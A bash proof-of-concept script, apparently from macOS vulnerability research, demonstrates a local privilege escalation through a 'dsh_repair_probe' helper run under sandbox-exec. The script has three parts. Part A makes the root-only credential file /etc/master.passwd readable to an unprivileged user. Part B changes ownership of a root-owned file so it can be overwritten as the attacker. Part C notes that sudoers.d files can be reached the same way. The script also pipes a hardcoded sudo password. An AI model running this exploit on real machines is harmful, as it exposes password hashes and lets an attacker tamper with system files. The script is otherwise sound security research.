#!/bin/bash
set +e
PROBE=/Users/test/dsh_repair_probe
echo "id: $(id -un) ($(id -u))"
echo

echo "### A. DISCLOSURE — read a root-only (0600) file as attacker ###"
SECRET=/etc/master.passwd
echo "target: $(ls -ln $SECRET 2>/dev/null)"
echo "attacker read BEFORE: $(head -c 60 $SECRET 2>&1 | tr -d '\n' | cut -c1-50)"
sandbox-exec -p '(version 1)(allow default)' "$PROBE" "$SECRET" >/dev/null 2>&1
sleep 1
echo "owner AFTER chown: $(stat -f '%Su:%Sg %Sp' $SECRET)"
echo "attacker read AFTER: $(head -c 60 $SECRET 2>&1 | tr -d '\n' | cut -c1-50)"
# restore (we have lab sudo)
echo test | sudo -S chown root:wheel "$SECRET" 2>/dev/null; echo "restored: $(stat -f '%Su:%Sg' $SECRET)"
echo

echo "### B. CONTENT TAMPER — rewrite a root-owned file's contents as attacker ###"
VICTIM=/Library/dsh_tamper_demo
echo test | sudo -S sh -c "echo 'ORIGINAL_ROOT_CONTENT' > '$VICTIM'; chown root:wheel '$VICTIM'; chmod 644 '$VICTIM'"
echo "before: owner=$(stat -f '%Su' $VICTIM) content='$(cat $VICTIM)'  attacker-write? $([ -w $VICTIM ] && echo yes || echo no)"
sandbox-exec -p '(version 1)(allow default)' "$PROBE" "$VICTIM" >/dev/null 2>&1
sleep 1
echo "after chown: owner=$(stat -f '%Su' $VICTIM)  attacker-write? $([ -w $VICTIM ] && echo yes || echo no)"
# now attacker (we are test) rewrite it
echo 'ATTACKER_CONTROLLED_CONTENT' > "$VICTIM" 2>/dev/null
echo "after attacker write: content='$(cat $VICTIM)'  owner=$(stat -f '%Su' $VICTIM)"
echo test | sudo -S rm -f "$VICTIM"
echo
echo "### C. sudoers reachable? (owner-check caveat demo, NON-destructive: real /etc/sudoers untouched) ###"
echo "real /etc/sudoers: $(ls -ln /etc/sudoers 2>/dev/null)"
echo "(scope test already proved /private/etc/sudoers.d/* is chown-reachable; sudo requires root-owner so forward-only breaks trust => needs inverse to restore)"